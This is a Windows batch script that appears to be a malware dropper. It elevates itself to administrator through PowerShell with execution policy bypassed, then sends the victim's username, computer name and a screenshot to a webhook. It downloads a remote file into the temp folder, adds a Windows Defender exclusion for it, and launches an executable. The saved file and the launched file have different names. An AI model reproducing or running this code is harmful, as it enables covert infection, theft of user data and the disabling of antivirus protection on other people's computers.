@echo off
net session >nul 2>&1
if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%file%'" & exit /b 0)

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```new viticm %username% - %computer% download %url%```\"}"  %webhook%
curl -i -H 'Expect: application/json' -F file=@%cd%\screenshot.png %webhook%
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%temp%\file.bat'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\file.bat'"
start %temp%\file.exe
